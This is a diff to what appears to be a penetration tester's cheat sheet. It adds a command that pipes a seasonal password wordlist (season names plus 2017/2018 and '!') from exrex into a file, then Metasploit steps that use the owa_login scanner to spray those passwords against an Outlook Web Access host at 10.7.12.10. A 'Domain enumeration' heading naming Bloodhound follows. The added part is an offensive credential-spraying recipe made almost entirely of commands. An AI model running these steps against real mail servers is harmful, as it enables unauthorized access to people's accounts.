@@ -36,10 +36,15 @@ Generate a list of passwords https://github.com/asciimoo/exrex
 
 
 ```
-python exrex.py "(Spring|Winter|Autumn|Fall|Summer)(20)1(78)!"
+python exrex.py "(Spring|Winter|Autumn|Fall|Summer)(20)1(78)!" > passwords.txt
 ```
 
-
+msfconsole
+auxiliary/scanner/http/owa_login
+set pass_file passwords.txt
+set user_file usernames.txt
+set domain
+set rhost 10.7.12.10
 
 ## Domain enumeration
 Bloodhound
